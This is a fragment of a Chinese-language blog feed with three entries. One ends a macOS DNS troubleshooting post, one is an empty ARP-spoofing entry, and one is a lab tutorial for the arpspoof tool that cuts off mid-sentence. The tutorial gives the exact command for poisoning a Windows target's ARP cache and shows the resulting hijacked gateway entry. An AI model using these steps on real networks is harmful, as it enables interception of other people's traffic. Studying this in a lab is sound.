class="hljs-number">0</span>] : 10.211.1.8<br>  nameserver[<span class="hljs-number">1</span>] : 10.211.133.8<br>  flags    : <span class="hljs-type">Supplemental</span>, Request A records, Request AAAA records<br>  reach    : 0<span class="hljs-type">x00000002</span> (Reachable)<br>  order    : 102200<br><br>resolver #<span class="hljs-number">2</span><br>  nameserver[<span class="hljs-number">0</span>] : <span class="hljs-type">fe80</span>::<span class="hljs-number">6</span>f1:<span class="hljs-number">69</span>ff:fed3:a0c4%<span class="hljs-number">11</span>d<br>  nameserver[<span class="hljs-number">1</span>] : 192.168.3.1<br>  if_index : 11 (<span class="hljs-type">en0</span>)<br>  flags    : <span class="hljs-type">Request</span> A records, Request AAAA records<br>  reach    : 0<span class="hljs-type">x00020002</span> (Reachable,Directly Reachable Address)<br>  order    : 200000<br>.<br>.<br>.<br>DNS configuration (<span class="hljs-keyword">for</span> scoped queries)<br><br>resolver #<span class="hljs-number">1</span><br>  nameserver[<span class="hljs-number">0</span>] : <span class="hljs-type">fe80</span>::<span class="hljs-number">6</span>f1:<span class="hljs-number">69</span>ff:fed3:a0c4%<span class="hljs-number">11</span>d<br>  nameserver[<span class="hljs-number">1</span>] : 192.168.3.1<br>  if_index : 11 (<span class="hljs-type">en0</span>)<br>  flags    : <span class="hljs-type">Scoped</span>, Request A records, Request AAAA records<br>  reach    : 0<span class="hljs-type">x00020002</span> (Reachable,Directly Reachable Address)<br></code></pre></td></tr></table></figure><p>3、系统界面查看当前网络DNS配置</p><p>设置-网络- Wi-Fi - 详细信息 - DNS ，是设置的B网络DNS</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">223.5.5.5</span><br></code></pre></td></tr></table></figure><h3 id="尝试解决方案1"><a href="#尝试解决方案1" class="headerlink" title="尝试解决方案1"></a>尝试解决方案1</h3><p>修改resolv.conf配置文件，配置没生效，依旧无法解析域名</p><p>1、终端修改DNS配置为B网络DNS</p><p>10.211.1.8 和 10.211.133.8 修改为 223.5.5.5</p><p>2、刷新DNS缓存</p><p>sudo dscacheutil -flushcache</p><p>sudo killall -HUP mDNSResponder</p><p>3、重新检查 resolv.conf 文件，确认已修改为 B 网络环境DNS</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ <span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;nameserver&quot;</span><br>nameserver <span class="hljs-number">223.5</span>.<span class="hljs-number">5.5</span><br></code></pre></td></tr></table></figure><p>4、scutil –dns 查看本机 DNS配置，发现没有生效，还是之前的配置</p><h3 id="尝试解决方案2"><a href="#尝试解决方案2" class="headerlink" title="尝试解决方案2"></a>尝试解决方案2</h3><p>小伙伴提醒，不需要手动配置DNS网关，运营商会默认指定</p><p>1、界面删除DNS</p><p><img src="/image-20241123075929307.png" alt="image-20241123075929307"></p><p>删除233.5.5.5，默认是本地网关</p><p><img src="/image-20241123075954850.png" alt="image-20241123075954850"></p><p>新开终端，重新尝试ping  <a href="http://www.baidu.com,依旧未成功/">www.baidu.com，依旧未成功</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_attack_欺骗</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_attack_%E6%AC%BA%E9%AA%97/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_attack_%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_tool_arpspoof</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_tool_arpspoof/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_tool_arpspoof/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>kali 默认会存在的 arp 攻击软件</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>apt install dsniff</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="查看版本和帮助"><a href="#查看版本和帮助" class="headerlink" title="查看版本和帮助"></a>查看版本和帮助</h2><p>arpspoof -h</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">└─# arpspoof -h<br>Version: 2.4<br>Usage: arpspoof <span class="hljs-comment">[-i interface]</span> <span class="hljs-comment">[-c own|host|both]</span> <span class="hljs-comment">[-t target]</span> <span class="hljs-comment">[-r]</span> host<br></code></pre></td></tr></table></figure><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</p><h3 id="参数解读"><a href="#参数解读" class="headerlink" title="参数解读"></a>参数解读</h3><p>-i interface 指定发送数据报的网卡</p><p>-c own|host|both 指定范围自己|特定主机|两者</p><p>-t target 指定攻击目标，如不指定则为 Lan上的所有主机</p><p>host 要拦截数据报的主机（也就是到那个机器的数据报），常为网关地址</p><p>-r 针对主机和目标主机，捕获双向流量（仅对 -t 生效）</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="攻击机-kali-网卡信息"><a href="#攻击机-kali-网卡信息" class="headerlink" title="攻击机 kali 网卡信息"></a>攻击机 kali 网卡信息</h3><p>ip地址 192.168.3.162</p><p>mac地址 00:0c:29:ac:f2:b5</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(root💀kali2021)-[/home/kali]<br>└─<span class="hljs-comment"># ifconfig</span><br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.3.162  netmask 255.255.255.0  broadcast 192.168.3.255<br>        inet6 2408:8207:2517:1041:20c:29ff:feac:f2b5  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x0&lt;global&gt;<br>        inet6 2408:8207:2517:1041:4f1:69d3:a0c4:8  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x0&lt;global&gt;<br>        inet6 2408:8207:2517:1041:92f6:6e4b:5410:b43e  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x0&lt;global&gt;<br>        inet6 fe80::20c:29ff:feac:f2b5  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;<br>        ether 00:0c:29:ac:f2:b5  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 1396529 </span> bytes<span class="hljs-number"> 1848939788 </span>(1.7 GiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 622124 </span> bytes<span class="hljs-number"> 72476728 </span>(69.1 MiB)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 16 </span> bytes<span class="hljs-number"> 800 </span>(800.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 16 </span> bytes<span class="hljs-number"> 800 </span>(800.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure><h3 id="靶机Windows信息"><a href="#靶机Windows信息" class="headerlink" title="靶机Windows信息"></a>靶机Windows信息</h3><p>ip地址 192.168.3.52</p><p>mac地址 00-0C-29-03-D3-D4</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs less">以太网适配器 Ethernet0:<br><br>连接特定的 DNS 后缀 . . . . . . . :<br>描述. . . . . . . . . . . . . . . : Intel(<span class="hljs-attribute">R) 82574L Gigabit Network Connection</span><br><span class="hljs-attribute">物理地址. . . . . . . . . . . . . </span>: <span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-<span class="hljs-number">03</span>-D3-D4<br>DHCP 已启用 . . . . . . . . . . . : 是<br>自动配置已启用. . . . . . . . . . : 是<br>IPv6 地址 . . . . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">d3</span>:<span class="hljs-attribute">a0c4</span>:<span class="hljs-number">9</span>(首选)<br>获得租约的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">13</span>日 <span class="hljs-number">12</span>:<span class="hljs-number">08</span>:<span class="hljs-number">29</span><br>租约过期的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">14</span>日 <span class="hljs-number">11</span>:<span class="hljs-number">29</span>:<span class="hljs-number">36</span><br>IPv6 地址 . . . . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-number">290</span><span class="hljs-attribute">b</span>:<span class="hljs-number">316</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">d19f</span>:<span class="hljs-number">7</span><span class="hljs-built_in">d23</span>(首选)<br>临时 IPv6 地址. . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-attribute">d9d</span>:<span class="hljs-attribute">a397</span>:<span class="hljs-attribute">a3f1</span>:<span class="hljs-built_in">b1e3</span>(首选)<br>临时 IPv6 地址. . . . . . . . . . : <span class="hljs-number">2408</span>:<span class="hljs-number">8207</span>:<span class="hljs-number">2517</span>:<span class="hljs-number">1041</span>:<span class="hljs-number">98</span><span class="hljs-attribute">d8</span>:<span class="hljs-number">6</span><span class="hljs-attribute">db6</span>:<span class="hljs-attribute">f82e</span>:<span class="hljs-number">42</span><span class="hljs-built_in">f4</span>(受到抨击)<br>本地链接 IPv6 地址. . . . . . . . : <span class="hljs-attribute">fe80</span>::<span class="hljs-number">290</span><span class="hljs-attribute">b</span>:<span class="hljs-number">316</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">d19f</span>:<span class="hljs-number">7</span>d23%<span class="hljs-number">3</span>(首选)<br>IPv4 地址 . . . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span>(首选)<br>子网掩码  . . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>获得租约的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">14</span>日 <span class="hljs-number">9</span>:<span class="hljs-number">07</span>:<span class="hljs-number">54</span><br>租约过期的时间  . . . . . . . . . : <span class="hljs-number">2022</span>年<span class="hljs-number">12</span>月<span class="hljs-number">21</span>日 <span class="hljs-number">9</span>:<span class="hljs-number">07</span>:<span class="hljs-number">54</span><br>默认网关. . . . . . . . . . . . . : <span class="hljs-attribute">fe80</span>::<span class="hljs-number">6</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">ff</span>:<span class="hljs-attribute">fed3</span>:a0c4%<span class="hljs-number">3</span><br>                                    <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>DHCP 服务器 . . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>DHCPv6 IAID . . . . . . . . . . . : <span class="hljs-number">100666409</span><br>DHCPv6 客户端 DUID  . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">2</span>A-<span class="hljs-number">29</span>-ED-<span class="hljs-number">2</span>F-<span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-<span class="hljs-number">03</span>-D3-D4<br>DNS 服务器  . . . . . . . . . . . : <span class="hljs-attribute">fe80</span>::<span class="hljs-number">6</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">ff</span>:<span class="hljs-attribute">fed3</span>:a0c4%<span class="hljs-number">3</span><br>                                    <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>                                    <span class="hljs-attribute">fe80</span>::<span class="hljs-number">6</span><span class="hljs-attribute">f1</span>:<span class="hljs-number">69</span><span class="hljs-attribute">ff</span>:<span class="hljs-attribute">fed3</span>:a0c4%<span class="hljs-number">3</span><br>TCPIP 上的 NetBIOS  . . . . . . . : 已启用<br><br><br></code></pre></td></tr></table></figure><h3 id="靶机-ARP-信息"><a href="#靶机-ARP-信息" class="headerlink" title="靶机 ARP 信息"></a>靶机 ARP 信息</h3><p>网关ip地址 192.168.3.1 </p><p>网关mac地址  04-f1-69-d3-a0-c4 </p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs subunit">C:\Users\C0isini&gt;arp -a<br><br>接口: 192.168.3.52 --- 0x3<br>  Internet 地址         物理地址              类型<br>  1.1.1.1               01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fc     静态<br>  192.168.3.1           04-f1<span class="hljs-string">-69</span>-d3-a0-c4     动态<br>  192.168.3.66          b0-be<span class="hljs-string">-83</span><span class="hljs-string">-46</span>-e7<span class="hljs-string">-28</span>     动态<br>  192.168.3.116         aa<span class="hljs-string">-26</span><span class="hljs-string">-24</span>-ba<span class="hljs-string">-49</span><span class="hljs-string">-05</span>     动态<br>  192.168.3.144         c4<span class="hljs-string">-07</span><span class="hljs-string">-2</span>f<span class="hljs-string">-25</span><span class="hljs-string">-97</span><span class="hljs-string">-8</span>e     动态<br>  192.168.3.148         be<span class="hljs-string">-13</span><span class="hljs-string">-22</span>-d8-b6<span class="hljs-string">-68</span>     动态<br>  192.168.3.255         ff-ff-ff-ff-ff-ff     静态<br>  224.0.0.22            01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span><span class="hljs-string">-16</span>     静态<br>  224.0.0.251           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fb     静态<br>  224.0.0.252           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fc     静态<br>  239.255.255.250       01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fa     静态<br>  255.255.255.255       ff-ff-ff-ff-ff-ff     静态<br></code></pre></td></tr></table></figure><h3 id="攻击机上执行攻击命令"><a href="#攻击机上执行攻击命令" class="headerlink" title="攻击机上执行攻击命令"></a>攻击机上执行攻击命令</h3><p>sudo arpspoof -i eth0 -t 192.168.3.52  -r 192.168.3.1</p><p>eth0 攻击机网卡</p><p>192.168.3.52 靶机IP地址</p><p>192.168.3.1 网关地址</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(root💀kali2021)-[<span class="hljs-regexp">/home/kali</span>]<br>└─<span class="hljs-comment"># sudo arpspoof -i eth0 -t 192.168.3.52  -r 192.168.3.1</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">4</span><span class="hljs-symbol">:f1</span><span class="hljs-symbol">:</span><span class="hljs-number">69</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:a0</span><span class="hljs-symbol">:c4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.52</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br><span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span> <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:d3</span><span class="hljs-symbol">:d4</span> 0806 <span class="hljs-number">42</span>: arp reply <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span> is-at <span class="hljs-number">0</span><span class="hljs-symbol">:c</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ac</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:b5</span><br></code></pre></td></tr></table></figure><h3 id="查看靶机-ARP-信息"><a href="#查看靶机-ARP-信息" class="headerlink" title="查看靶机 ARP 信息"></a>查看靶机 ARP 信息</h3><p>网关 192.168.3.1 mac地址已由 04-f1-69-d3-a0-c4 修改为攻击机 mac 地址00-0c-29-ac-f2-b5</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs subunit">C:\Users\C0isini&gt;arp -a<br><br>接口: 192.168.3.52 --- 0x3<br>  Internet 地址         物理地址              类型<br>  1.1.1.1               01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fc     静态<br>  192.168.3.1           00<span class="hljs-string">-0</span>c<span class="hljs-string">-29</span>-ac-f2-b5     动态<br>  192.168.3.66          b0-be<span class="hljs-string">-83</span><span class="hljs-string">-46</span>-e7<span class="hljs-string">-28</span>     动态<br>  192.168.3.116         aa<span class="hljs-string">-26</span><span class="hljs-string">-24</span>-ba<span class="hljs-string">-49</span><span class="hljs-string">-05</span>     动态<br>  192.168.3.144         c4<span class="hljs-string">-07</span><span class="hljs-string">-2</span>f<span class="hljs-string">-25</span><span class="hljs-string">-97</span><span class="hljs-string">-8</span>e     动态<br>  192.168.3.148         be<span class="hljs-string">-13</span><span class="hljs-string">-22</span>-d8-b6<span class="hljs-string">-68</span>     动态<br>  192.168.3.162         00<span class="hljs-string">-0</span>c<span class="hljs-string">-29</span>-ac-f2-b5     动态<br>  192.168.3.255         ff-ff-ff-ff-ff-ff     静态<br>  224.0.0.22            01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span><span class="hljs-string">-16</span>     静态<br>  224.0.0.251           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fb     静态<br>  224.0.0.252           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fc     静态<br>  239.255.255.250       01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fa     静态<br>  255.255.255.255       ff-ff-ff-ff-ff-ff     静态<br></code></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>实现 arp 